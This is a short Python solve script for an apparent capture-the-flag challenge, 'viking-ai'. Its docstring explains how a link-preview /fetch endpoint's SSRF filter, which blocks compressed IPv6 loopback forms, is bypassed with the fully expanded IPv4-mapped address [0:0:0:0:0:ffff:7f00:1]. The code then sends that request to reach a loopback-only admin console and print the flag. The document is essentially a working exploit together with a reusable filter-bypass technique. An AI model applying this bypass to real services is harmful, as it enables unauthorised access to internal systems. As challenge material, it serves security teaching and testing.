#!/usr/bin/env python3
"""Solve viking-ai: SSRF through the /fetch link-preview tool.

The tool blocks the loopback spellings a quick SSRF reaches for, and now also
parses the host and rejects loopback addresses written in COMPRESSED IPv6 form
(anything with "::"), which catches every compact IPv4-mapped spelling at once
(::ffff:127.0.0.1, ::ffff:7f00:1, ...). But it only normalises the compressed
forms: a fully-expanded, eight-group IPv4-mapped literal, [0:0:0:0:0:ffff:7f00:1],
is the exact same 127.0.0.1 and has no "::", so it sails past the filter and
reaches the loopback-only admin console. We make the shop fetch it for us.

Usage:  python3 solve.py http://<host>:<port>     # e.g. http://localhost:5009
"""
import sys
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5009").rstrip("/")
INTERNAL = "http://[0:0:0:0:0:ffff:7f00:1]:9000/internal/flag"  # fully-expanded ::ffff:7f00:1 == 127.0.0.1; no "::", so unfiltered

url = BASE + "/fetch?url=" + urllib.parse.quote(INTERNAL, safe="")
print("GET", url)
with urllib.request.urlopen(url, timeout=10) as r:
    print(r.read().decode())
